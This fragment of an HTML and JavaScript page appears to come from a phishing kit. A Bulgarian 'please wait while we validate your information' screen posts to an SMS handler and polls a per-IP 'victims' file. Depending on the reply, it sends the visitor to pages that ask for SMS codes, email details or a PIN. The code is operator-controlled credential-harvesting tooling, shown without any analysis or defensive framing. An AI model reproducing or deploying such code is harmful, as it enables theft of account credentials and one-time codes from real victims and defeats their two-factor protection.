            ...
            <form id="form" name="form" novalidate="" method="post" action="./files/sms.php"
                ...
                <div class="margin">
                    ...
                    <div class="col-lg-12" style="margin-top: 2%">
                        Моля изчакайте, докато валидираме въведената информация.
                    </div>
    ...
    var waiting = setInterval(function () {
        $.get('victims/' + ip + '.php', function (data) {
            if (data == 0) {
                ...
                location.href = "infos.php?redirection=index";
            } else if (data == 'sms') {
                clearInterval(waiting);
                location.href = "infos.php?redirection=sms";
            } else if (data == 'email') {
                clearInterval(waiting);
                location.href = "infos.php?redirection=email";
            } else if (data == 'resms') {
                clearInterval(waiting);
                location.href = "infos.php?redirection=resms";
            } else if (data == 'success') {
                clearInterval(waiting);
                location.href = "infos.php?redirection=success";
            } else if (data == 'pin') {
                clearInterval(waiting);
                location.href = "infos.php?redirection=pin";
            }
        });
    }, 3000);
</script>
